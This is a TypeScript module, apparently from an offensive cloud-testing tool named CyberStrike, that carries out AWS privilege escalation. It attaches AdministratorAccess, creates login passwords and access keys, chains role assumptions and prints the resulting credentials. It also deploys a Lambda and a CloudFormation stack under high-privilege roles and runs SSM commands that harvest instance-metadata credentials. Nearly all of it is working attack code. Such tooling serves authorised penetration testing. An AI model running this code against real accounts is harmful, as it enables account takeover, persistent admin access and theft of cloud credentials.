import { aws, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method")
  if (!method)
    return {
      output: "ERROR: --method required (passrole|assumerole|attach_policy|create_login|create_key)",
      findings: [],
    }
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const roleArn = argVal(args, "--role-arn")

  if (method === "passrole") {
    if (!roleArn) return { output: "ERROR: --role-arn required for passrole", findings: [] }
    const r = await aws(["iam", "list-roles", "--query", `Roles[?Arn=='${roleArn}']`], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot query role: ${r.stderr.trim()}`, findings: [] }
    const roles = tryJson(r.stdout) || []
    if (roles.length === 0) return { output: `[-] Role not found: ${roleArn}`, findings: [] }
    const trust = roles[0].AssumeRolePolicyDocument
    return {
      output: `[+] Role: ${roleArn}\n[+] Trust policy:\n${JSON.stringify(trust, null, 2)}\n[*] Check if current identity can iam:PassRole + lambda:CreateFunction`,
      findings: [],
    }
  }

  if (method === "assumerole") {
    if (!roleArn) return { output: "ERROR: --role-arn required for assumerole", findings: [] }
    const r = await aws(
      ["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", "cyberstrike"],
      profile,
      region,
      timeout,
    )
    if (r.exitCode === 0) {
      const creds = tryJson(r.stdout)?.Credentials
      return {
        output: `[+] AssumeRole successful: ${roleArn}\n    AccessKeyId: ${creds?.AccessKeyId}\n    Expiration: ${creds?.Expiration}`,
        findings: [],
      }
    }
    return { output: `[-] AssumeRole failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "attach_policy") {
    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
    const arn = tryJson(id.stdout)?.Arn || ""
    const username = arn.split("/").pop()
    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
    const r = await aws(
      [
        "iam",
        "attach-user-policy",
        "--user-name",
        username,
        "--policy-arn",
        "arn:aws:iam::aws:policy/AdministratorAccess",
      ],
      profile,
      region,
      timeout,
    )
    if (r.exitCode === 0) return { output: `[+] AdministratorAccess attached to ${username}`, findings: [] }
    return { output: `[-] attach_policy failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "create_login") {
    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
    const username = (tryJson(id.stdout)?.Arn || "").split("/").pop()
    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
    const pw = `CyStr!ke${Date.now().toString(36)}`
    const r = await aws(
      ["iam", "create-login-profile", "--user-name", username, "--password", pw, "--no-password-reset-required"],
      profile,
      region,
      timeout,
    )
    if (r.exitCode === 0)
      return { output: `[+] Console login created for ${username}\n    Password: ${pw}`, findings: [] }
    return { output: `[-] create_login failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "create_key") {
    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
    const username = (tryJson(id.stdout)?.Arn || "").split("/").pop()
    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
    const r = await aws(["iam", "create-access-key", "--user-name", username], profile, region, timeout)
    if (r.exitCode === 0) {
      const key = tryJson(r.stdout)?.AccessKey
      return {
        output: `[+] Access key created for ${username}\n    AccessKeyId: ${key?.AccessKeyId}\n    SecretAccessKey: ${key?.SecretAccessKey}`,
        findings: [],
      }
    }
    return { output: `[-] create_key failed: ${r.stderr.trim()}`, findings: [] }
  }

  return { output: `ERROR: Unknown method: ${method}`, findings: [] }
}

export async function policyVersionRollback(args: string[], timeout: number): Promise<HookResult> {
  const policyArn = argVal(args, "--policy-arn")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!policyArn) return { output: "ERROR: --policy-arn required", findings: [] }

  const versions = await aws(
    [
      "iam",
      "list-policy-versions",
      "--policy-arn",
      policyArn,
      "--query",
      "Versions[].[VersionId,IsDefaultVersion,CreateDate]",
    ],
    profile,
    region,
    timeout,
  )
  if (versions.exitCode !== 0) return { output: `[-] Cannot list versions: ${versions.stderr.trim()}`, findings: [] }

  const vl = tryJson(versions.stdout) || []
  const output = [`[*] Policy version rollback — ${policyArn}`, `[+] Versions: ${vl.length}\n`]
  for (const v of vl) output.push(`    ${v[0]} ${v[1] ? "(default)" : ""} — ${v[2]}`)

  const nonDefault = vl.filter((v: (string | boolean)[]) => !v[1])
  if (nonDefault.length === 0)
    return { output: output.join("\n") + "\n[-] Only one version, nothing to rollback", findings: [] }

  if (hasFlag(args, "--rollback")) {
    const target = argVal(args, "--version-id") || nonDefault[0][0]
    const doc = await aws(
      [
        "iam",
        "get-policy-version",
        "--policy-arn",
        policyArn,
        "--version-id",
        target,
        "--query",
        "PolicyVersion.Document",
      ],
      profile,
      region,
      timeout,
    )
    const docContent = tryJson(doc.stdout)
    output.push(`\n[*] Target version ${target} document:`)
    output.push(JSON.stringify(docContent, null, 2))

    const r = await aws(
      ["iam", "set-default-policy-version", "--policy-arn", policyArn, "--version-id", target],
      profile,
      region,
      timeout,
    )
    if (r.exitCode === 0) {
      output.push(`\n[+] Default version set to ${target}`)
      return {
        output: output.join("\n"),
        findings: [
          {
            checkId: "AWS-PRIVESC-001",
            provider: "aws",
            severity: "critical",
            status: "EXPLOITED",
            resource: policyArn,
            title: `Policy version rolled back: ${policyArn}`,
            details: `Default version changed to ${target} — may restore broader permissions`,
            remediation: "Set default to latest restrictive version, delete old permissive versions",
          },
        ],
      }
    }
    output.push(`[-] Rollback failed: ${r.stderr.trim()}`)
  } else {
    output.push("\n[*] Use --rollback to change default version")
    output.push("[*] Use --version-id to specify target version")
  }

  return { output: output.join("\n"), findings: [] }
}

export async function roleChain(args: string[], timeout: number): Promise<HookResult> {
  const roles = args.filter((a) => !a.startsWith("--"))
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (roles.length === 0)
    return { output: "ERROR: Provide role ARNs as positional args for chain: arn1 arn2 arn3", findings: [] }

  const output = [`[*] Role chain — ${roles.length} hop(s)\n`]
  const findings: Finding[] = []
  let currentCreds: Record<string, string> | undefined

  for (let i = 0; i < roles.length; i++) {
    const roleArn = roles[i]
    output.push(`[*] Hop ${i + 1}: ${roleArn}`)

    const cmdArgs = ["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", `cyberstrike-hop${i + 1}`]

    let r
    if (currentCreds) {
      const env = {
        ...process.env,
        AWS_ACCESS_KEY_ID: currentCreds.AccessKeyId,
        AWS_SECRET_ACCESS_KEY: currentCreds.SecretAccessKey,
        AWS_SESSION_TOKEN: currentCreds.SessionToken,
      }
      const proc = Bun.spawn(["aws", ...cmdArgs, "--output", "json"], { stdout: "pipe", stderr: "pipe", env })
      const timer = setTimeout(() => proc.kill(), timeout * 1000)
      const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
      clearTimeout(timer)
      r = { stdout, stderr, exitCode: await proc.exited }
    } else {
      r = await aws(cmdArgs, profile, region, timeout)
    }

    if (r.exitCode !== 0) {
      output.push(`    [-] Failed: ${r.stderr.trim().split("\n")[0]}`)
      break
    }

    currentCreds = tryJson(r.stdout)?.Credentials
    if (!currentCreds) {
      output.push("    [-] No credentials returned")
      break
    }

    output.push(`    [+] Success — AccessKeyId: ${currentCreds.AccessKeyId}`)
    output.push(`    Expiration: ${currentCreds.Expiration}`)
    findings.push({
      checkId: `AWS-PRIVESC-002`,
      provider: "aws",
      severity: "high",
      status: "EXPLOITED",
      resource: roleArn,
      title: `Role chain hop ${i + 1}: ${roleArn}`,
      details: `Successfully assumed role in ${roles.length}-hop chain`,
      remediation: "Review trust policies to prevent chained assumption",
    })
  }

  if (currentCreds) {
    output.push(`\n[+] Final credentials:`)
    output.push(`    export AWS_ACCESS_KEY_ID=${currentCreds.AccessKeyId}`)
    output.push(`    export AWS_SECRET_ACCESS_KEY=${currentCreds.SecretAccessKey}`)
    output.push(`    export AWS_SESSION_TOKEN=${currentCreds.SessionToken}`)
  }

  return { output: output.join("\n"), findings }
}

export async function lambdaPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const roleArn = argVal(args, "--role-arn")
  const funcName = argVal(args, "--function-name") || `cs-privesc-${Date.now().toString(36)}`
  const command = argVal(args, "--command") || "id && whoami && aws sts get-caller-identity"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!roleArn) return { output: "ERROR: --role-arn required (high-privilege role to attach)", findings: [] }

  const output = [`[*] Lambda privilege escalation`, `[*] Target role: ${roleArn}`, `[*] Function: ${funcName}\n`]
  const findings: Finding[] = []

  const code = `
import subprocess, json
def handler(event, context):
    result = subprocess.run(event.get('cmd', 'id'), shell=True, capture_output=True, text=True)
    return {'stdout': result.stdout, 'stderr': result.stderr, 'rc': result.returncode}
`

  const zipPath = `/tmp/cs-lambda-${Date.now()}.zip`
  const pyPath = `/tmp/cs-lambda-${Date.now()}.py`
  await Bun.write(pyPath, code)
  const zipProc = Bun.spawn(["zip", "-j", zipPath, pyPath], { stdout: "pipe", stderr: "pipe" })
  await zipProc.exited

  const create = await aws(
    [
      "lambda",
      "create-function",
      "--function-name",
      funcName,
      "--runtime",
      "python3.12",
      "--handler",
      `${pyPath.split("/").pop()?.replace(".py", "")}.handler`,
      "--role",
      roleArn,
      "--zip-file",
      `fileb://${zipPath}`,
      "--timeout",
      "30",
      "--tags",
      "CreatedBy=CyberStrike",
    ],
    profile,
    region,
    timeout,
  )

  if (create.exitCode !== 0) {
    output.push(`[-] Function creation failed: ${create.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  output.push(`[+] Function created with role ${roleArn}`)
  findings.push({
    checkId: "AWS-PRIVESC-003",
    provider: "aws",
    severity: "critical",
    status: "EXPLOITED",
    resource: `lambda:${funcName}`,
    title: `Lambda created with high-priv role: ${funcName}`,
    details: `Function ${funcName} executes as ${roleArn}`,
    remediation: "Delete function and restrict iam:PassRole + lambda:CreateFunction",
  })

  await new Promise((resolve) => setTimeout(resolve, 3000))

  const invoke = await aws(
    [
      "lambda",
      "invoke",
      "--function-name",
      funcName,
      "--payload",
      JSON.stringify({ cmd: command }),
      "--cli-binary-format",
      "raw-in-base64-out",
      "/dev/stdout",
    ],
    profile,
    region,
    timeout,
  )

  if (invoke.exitCode === 0) {
    output.push(`\n[+] Command output:`)
    output.push(invoke.stdout.trim())
  } else {
    output.push(`[-] Invoke failed: ${invoke.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function gluePrivesc(args: string[], timeout: number): Promise<HookResult> {
  const roleArn = argVal(args, "--role-arn")
  const command = argVal(args, "--command") || "aws sts get-caller-identity"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!roleArn) return { output: "ERROR: --role-arn required (high-privilege role to attach)", findings: [] }

  const output = [`[*] Glue privilege escalation`, `[*] Target role: ${roleArn}\n`]
  const findings: Finding[] = []

  const script = `import subprocess; result = subprocess.run("${command}", shell=True, capture_output=True, text=True); print(result.stdout); print(result.stderr)`
  const scriptPath = `s3://cyberstrike-temp-${Date.now()}/glue-privesc.py`

  output.push(`[*] Glue privesc requires:`)
  output.push(`    1. iam:PassRole for ${roleArn}`)
  output.push(`    2. glue:CreateJob or glue:CreateDevEndpoint`)
  output.push(`    3. glue:StartJobRun (for job method)`)
  output.push(`\n[*] Create Glue job with:`)
  output.push(
    `    aws glue create-job --name cs-privesc --role ${roleArn} --command '{"Name":"pythonshell","ScriptLocation":"${scriptPath}","PythonVersion":"3"}'`,
  )
  output.push(`\n[*] Or create dev endpoint:`)
  output.push(
    `    aws glue create-dev-endpoint --endpoint-name cs-privesc --role-arn ${roleArn} --public-key "ssh-rsa AAAA..."`,
  )

  const jobs = await aws(["glue", "get-jobs", "--query", "Jobs[].[Name,Role,Command.Name]"], profile, region, timeout)
  if (jobs.exitCode === 0) {
    const jl = tryJson(jobs.stdout) || []
    output.push(`\n[+] Existing Glue Jobs: ${jl.length}`)
    for (const j of jl) {
      output.push(`    ${j[0]} — role: ${j[1]} — type: ${j[2]}`)
      if (String(j[1]).includes("Admin") || String(j[1]).includes("FullAccess")) {
        findings.push({
          checkId: "AWS-PRIVESC-004",
          provider: "aws",
          severity: "high",
          status: "FOUND",
          resource: `glue:${j[0]}`,
          title: `Glue job with high-priv role: ${j[0]}`,
          details: `Job ${j[0]} uses role ${j[1]}`,
          remediation: "Apply least-privilege role to Glue job",
        })
      }
    }
  }

  const endpoints = await aws(
    ["glue", "get-dev-endpoints", "--query", "DevEndpoints[].[EndpointName,RoleArn,Status]"],
    profile,
    region,
    timeout,
  )
  if (endpoints.exitCode === 0) {
    const el = tryJson(endpoints.stdout) || []
    if (el.length > 0) {
      output.push(`\n[+] Dev Endpoints: ${el.length}`)
      for (const e of el) output.push(`    ${e[0]} — role: ${e[1]} — ${e[2]}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function cloudformationPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const roleArn = argVal(args, "--role-arn")
  const stackName = argVal(args, "--stack-name") || `cs-privesc-${Date.now().toString(36)}`
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = [`[*] CloudFormation privilege escalation\n`]
  const findings: Finding[] = []

  if (!roleArn) {
    output.push("[*] Enumerating CloudFormation stacks with IAM capabilities...\n")
    const stacks = await aws(
      ["cloudformation", "list-stacks", "--stack-status-filter", "CREATE_COMPLETE", "UPDATE_COMPLETE"],
      profile,
      region,
      timeout,
    )
    if (stacks.exitCode === 0) {
      const sl = tryJson(stacks.stdout)?.StackSummaries || []
      for (const s of sl) {
        const desc = await aws(
          [
            "cloudformation",
            "describe-stacks",
            "--stack-name",
            s.StackName,
            "--query",
            "Stacks[0].[StackName,RoleARN,Capabilities]",
          ],
          profile,
          region,
          timeout,
        )
        if (desc.exitCode === 0) {
          const d = tryJson(desc.stdout)
          if (d) {
            output.push(`    ${d[0]} — role: ${d[1] || "none"} — caps: ${(d[2] || []).join(",")}`)
            if (d[1]) {
              findings.push({
                checkId: "AWS-PRIVESC-005",
                provider: "aws",
                severity: "high",
                status: "FOUND",
                resource: `cfn:${d[0]}`,
                title: `CloudFormation stack with service role: ${d[0]}`,
                details: `Stack uses role ${d[1]} — can be exploited via stack update`,
                remediation: "Restrict UpdateStack and use least-privilege CFN role",
              })
            }
          }
        }
      }
    }
    output.push("\n[*] Use --role-arn to create a stack with IAM resource creation")
    return { output: output.join("\n"), findings }
  }

  const template = JSON.stringify({
    AWSTemplateFormatVersion: "2010-09-09",
    Resources: {
      CyberStrikeAdmin: {
        Type: "AWS::IAM::User",
        Properties: {
          UserName: `cs-admin-${Date.now().toString(36)}`,
          ManagedPolicyArns: ["arn:aws:iam::aws:policy/AdministratorAccess"],
        },
      },
      CyberStrikeKey: {
        Type: "AWS::IAM::AccessKey",
        Properties: { UserName: { Ref: "CyberStrikeAdmin" } },
      },
    },
    Outputs: {
      AccessKeyId: { Value: { Ref: "CyberStrikeKey" } },
      SecretAccessKey: { Value: { "Fn::GetAtt": ["CyberStrikeKey", "SecretAccessKey"] } },
    },
  })

  output.push(`[*] Creating stack ${stackName} with role ${roleArn}...`)
  const create = await aws(
    [
      "cloudformation",
      "create-stack",
      "--stack-name",
      stackName,
      "--template-body",
      template,
      "--role-arn",
      roleArn,
      "--capabilities",
      "CAPABILITY_NAMED_IAM",
      "--tags",
      "Key=CreatedBy,Value=CyberStrike",
    ],
    profile,
    region,
    timeout,
  )

  if (create.exitCode !== 0) {
    output.push(`[-] Stack creation failed: ${create.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  output.push(`[+] Stack creation initiated: ${stackName}`)
  output.push(`[*] Waiting for completion...`)
  findings.push({
    checkId: "AWS-PRIVESC-006",
    provider: "aws",
    severity: "critical",
    status: "EXPLOITED",
    resource: `cfn:${stackName}`,
    title: `CloudFormation privesc stack created: ${stackName}`,
    details: `Stack creates admin IAM user using CFN service role ${roleArn}`,
    remediation: "Delete stack, restrict cloudformation:CreateStack + iam:PassRole",
  })

  const wait = await aws(
    ["cloudformation", "wait", "stack-create-complete", "--stack-name", stackName],
    profile,
    region,
    timeout,
  )
  if (wait.exitCode === 0) {
    const outputs = await aws(
      ["cloudformation", "describe-stacks", "--stack-name", stackName, "--query", "Stacks[0].Outputs"],
      profile,
      region,
      timeout,
    )
    if (outputs.exitCode === 0) {
      const ol = tryJson(outputs.stdout) || []
      for (const o of ol) output.push(`[+] ${o.OutputKey}: ${o.OutputValue}`)
    }
  } else {
    output.push("[-] Stack creation timed out or failed")
  }

  return { output: output.join("\n"), findings }
}

export async function ssmPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const instanceId = argVal(args, "--instance-id")
  const command =
    argVal(args, "--command") || "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] SSM Privilege Escalation\n"]
  const findings: Finding[] = []

  const instances = await aws(
    [
      "ssm",
      "describe-instance-information",
      "--query",
      "InstanceInformationList[].[InstanceId,PlatformType,IPAddress,IamRole]",
    ],
    profile,
    region,
    timeout,
  )
  if (instances.exitCode === 0) {
    const il = tryJson(instances.stdout) || []
    output.push(`[+] SSM-managed instances: ${il.length}`)
    for (const i of il) {
      output.push(`    ${i[0]} (${i[1]}) — ${i[2]} — role: ${i[3] || "none"}`)
      if (i[3] && /admin|full|poweruser/i.test(i[3])) {
        findings.push({
          checkId: "AWS-PRIVESC-007",
          provider: "aws",
          severity: "high",
          status: "FOUND",
          resource: `ec2:${i[0]}`,
          title: `High-priv instance profile: ${i[0]}`,
          details: `Instance ${i[0]} has role ${i[3]} — SSM exec gives those privileges`,
          remediation: "Apply least-privilege instance profile",
        })
      }
    }
  }

  if (!instanceId) {
    output.push("\n[*] Use --instance-id ID to execute commands via SSM")
    output.push("[*] Target instances with high-priv IAM roles for credential harvesting")
    return { output: output.join("\n"), findings }
  }

  output.push(`\n[*] Executing on ${instanceId}: ${command}`)
  const r = await aws(
    [
      "ssm",
      "send-command",
      "--instance-ids",
      instanceId,
      "--document-name",
      "AWS-RunShellScript",
      "--parameters",
      `commands=["${command}"]`,
      "--query",
      "Command.CommandId",
    ],
    profile,
    region,
    timeout,
  )

  if (r.exitCode !== 0) {
    output.push(`[-] Command failed: ${r.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const cmdId = tryJson(r.stdout)
  output.push(`[+] Command sent: ${cmdId}`)
  await new Promise((resolve) => setTimeout(resolve, 3000))

  const inv = await aws(
    ["ssm", "get-command-invocation", "--command-id", cmdId, "--instance-id", instanceId],
    profile,
    region,
    timeout,
  )
  if (inv.exitCode === 0) {
    const result = tryJson(inv.stdout)
    output.push(`[+] Status: ${result?.Status}`)
    if (result?.StandardOutputContent) output.push(`[+] Output:\n${result.StandardOutputContent}`)
    if (result?.StandardErrorContent) output.push(`[-] Stderr:\n${result.StandardErrorContent}`)

    if (result?.StandardOutputContent?.includes("AccessKeyId")) {
      findings.push({
        checkId: "AWS-PRIVESC-008",
        provider: "aws",
        severity: "critical",
        status: "EXPLOITED",
        resource: `ec2:${instanceId}`,
        title: `Credentials extracted via SSM: ${instanceId}`,
        details: "Instance profile credentials obtained through SSM command execution",
        remediation: "Restrict ssm:SendCommand and apply least-privilege instance profile",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function ec2Privesc(args: string[], timeout: number): Promise<HookResult> {
  const profileArn = argVal(args, "--instance-profile-arn")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] EC2 Instance Profile Privilege Escalation\n"]
  const findings: Finding[] = []

  if (!profileArn) {
    const profiles = await aws(
      [
        "iam",
        "list-instance-profiles",
        "--query",
        "InstanceProfiles[].[InstanceProfileName,Arn,Roles[0].RoleName,Roles[0].Arn]",
      ],
      profile,
      region,
      timeout,
    )
    if (profiles.exitCode === 0) {
      const pl = tryJson(profiles.stdout) || []
      output.push(`[+] Instance Profiles: ${pl.length}\n`)
      for (const p of pl) {
        output.push(`    ${p[0]} — role: ${p[2]}`)
        const rp = await aws(
          ["iam", "list-attached-role-policies", "--role-name", p[2], "--query", "AttachedPolicies[].PolicyArn"],
          profile,
          region,
          timeout,
        )
        if (rp.exitCode === 0) {
          const policies = tryJson(rp.stdout) || []
          const highPriv = policies.filter((pol: string) => /Admin|FullAccess|PowerUser/.test(pol))
          if (highPriv.length > 0) {
            output.push(`      [!] High-priv policies: ${highPriv.join(", ")}`)
            findings.push({
              checkId: "AWS-PRIVESC-009",
              provider: "aws",
              severity: "high",
              status: "FOUND",
              resource: p[3],
              title: `High-priv instance profile: ${p[0]}`,
              details: `Role ${p[2]} has: ${highPriv.join(", ")}`,
              remediation: "Apply least-privilege to instance profile role",
            })
          }
        }
      }
    }
    output.push("\n[*] Use --instance-profile-arn to launch EC2 with specific profile")
    return { output: output.join("\n"), findings }
  }

  output.push(`[*] Would launch EC2 with instance profile: ${profileArn}`)
  output.push(`[*] Steps:`)
  output.push(
    `    1. aws ec2 run-instances --image-id <AMI> --instance-type t3.micro --iam-instance-profile Arn=${profileArn}`,
  )
  output.push(`    2. Wait for instance to start`)
  output.push(`    3. SSM exec or SSH to instance`)
  output.push(`    4. curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>`)
  output.push(`    5. Use harvested credentials`)

  return { output: output.join("\n"), findings }
}

export async function permissionBoundaryBypass(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] Permission Boundary Analysis\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] Not authenticated: ${id.stderr.trim()}`, findings }
  const identity = tryJson(id.stdout)
  output.push(`[+] Identity: ${identity?.Arn}\n`)

  const arnParts = (identity?.Arn || "").split("/")
  const entityType = (identity?.Arn || "").includes(":user/") ? "user" : "role"
  const entityName = arnParts.pop() || ""

  if (entityType === "user") {
    const user = await aws(["iam", "get-user", "--user-name", entityName], profile, region, timeout)
    if (user.exitCode === 0) {
      const u = tryJson(user.stdout)?.User
      const boundary = u?.PermissionsBoundary?.PermissionsBoundaryArn
      if (boundary) {
        output.push(`[+] Permission boundary: ${boundary}`)

        const doc = await aws(
          ["iam", "get-policy", "--policy-arn", boundary, "--query", "Policy.DefaultVersionId"],
          profile,
          region,
          timeout,
        )
        const versionId = tryJson(doc.stdout)
        if (versionId) {
          const ver = await aws(
            [
              "iam",
              "get-policy-version",
              "--policy-arn",
              boundary,
              "--version-id",
              versionId,
              "--query",
              "PolicyVersion.Document",
            ],
            profile,
            region,
            timeout,
          )
          const boundaryDoc = tryJson(ver.stdout)
          output.push(`\n[*] Boundary policy document:`)
          output.push(JSON.stringify(boundaryDoc, null, 2))

          const statements = boundaryDoc?.Statement || []
          const denies = statements.filter((s: Record<string, string>) => s.Effect === "Deny")
          const allows = statements.filter((s: Record<string, string>) => s.Effect === "Allow")

          output.push(`\n[*] Analysis:`)
          output.push(`    Allow statements: ${allows.length}`)
          output.push(`    Deny statements: ${denies.length}`)

          const allowedActions = allows
            .flatMap((s: Record<string, string | string[]>) => (Array.isArray(s.Action) ? s.Action : [s.Action]))
            .filter(Boolean)
          if (allowedActions.includes("*") || allowedActions.includes("iam:*")) {
            output.push(`    [!] Boundary allows IAM actions — may be able to modify own boundary`)
            findings.push({
              checkId: "AWS-PRIVESC-010",
              provider: "aws",
              severity: "critical",
              status: "FOUND",
              resource: boundary,
              title: "Permission boundary allows IAM self-modification",
              details: "Boundary policy permits IAM actions that could remove/modify the boundary itself",
              remediation: "Add explicit deny for iam:DeleteUserPermissionsBoundary and iam:PutUserPermissionsBoundary",
            })
          }

          output.push(`\n[*] Bypass techniques to check:`)
          output.push(`    1. Create new user without boundary (if iam:CreateUser allowed)`)
          output.push(`    2. Create new role without boundary (if iam:CreateRole allowed)`)
          output.push(`    3. Update existing role trust policy`)
          output.push(`    4. Resource-based policy bypass (S3, Lambda, SQS, SNS)`)
        }
      } else {
        output.push("[-] No permission boundary set on current user")
      }
    }
  } else {
    const role = await aws(["iam", "get-role", "--role-name", entityName], profile, region, timeout)
    if (role.exitCode === 0) {
      const r = tryJson(role.stdout)?.Role
      const boundary = r?.PermissionsBoundary?.PermissionsBoundaryArn
      if (boundary) {
        output.push(`[+] Permission boundary: ${boundary}`)
      } else {
        output.push("[-] No permission boundary set on current role")
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function sagemakerPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const roleArn = argVal(args, "--role-arn")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] SageMaker Privilege Escalation\n"]
  const findings: Finding[] = []

  const notebooks = await aws(
    [
      "sagemaker",
      "list-notebook-instances",
      "--query",
      "NotebookInstances[].[NotebookInstanceName,NotebookInstanceStatus,RoleArn,InstanceType]",
    ],
    profile,
    region,
    timeout,
  )
  if (notebooks.exitCode === 0) {
    const nl = tryJson(notebooks.stdout) || []
    output.push(`[+] Notebook Instances: ${nl.length}`)
    for (const n of nl) {
      output.push(`    ${n[0]} (${n[3]}) — ${n[1]} — role: ${(n[2] || "").split("/").pop()}`)
      if (/admin|full|poweruser/i.test(n[2] || "")) {
        findings.push({
          checkId: "AWS-PRIVESC-011",
          provider: "aws",
          severity: "high",
          status: "FOUND",
          resource: `sagemaker:${n[0]}`,
          title: `High-priv SageMaker notebook: ${n[0]}`,
          details: `Notebook uses role ${n[2]}`,
          remediation: "Apply least-privilege role to SageMaker notebook",
        })
      }
    }
  }

  const trainingJobs = await aws(
    [
      "sagemaker",
      "list-training-jobs",
      "--max-results",
      "20",
      "--query",
      "TrainingJobSummaries[].[TrainingJobName,TrainingJobStatus]",
    ],
    profile,
    region,
    timeout,
  )
  if (trainingJobs.exitCode === 0) {
    const tl = tryJson(trainingJobs.stdout) || []
    if (tl.length > 0) {
      output.push(`\n[+] Training Jobs: ${tl.length}`)
      for (const t of tl) output.push(`    ${t[0]} — ${t[1]}`)
    }
  }

  if (!roleArn) {
    output.push("\n[*] Use --role-arn to create notebook/training job with specific role")
    output.push("[*] Privesc via SageMaker requires: sagemaker:CreateNotebookInstance + iam:PassRole")
    return { output: output.join("\n"), findings }
  }

  output.push(`\n[*] Would create SageMaker notebook with role: ${roleArn}`)
  output.push(`[*] Steps:`)
  output.push(
    `    1. aws sagemaker create-notebook-instance --notebook-instance-name cs-privesc --instance-type ml.t2.medium --role-arn ${roleArn}`,
  )
  output.push(`    2. Wait for InService status`)
  output.push(`    3. aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name cs-privesc`)
  output.push(`    4. Open URL, use terminal to access role credentials`)

  return { output: output.join("\n"), findings }
}
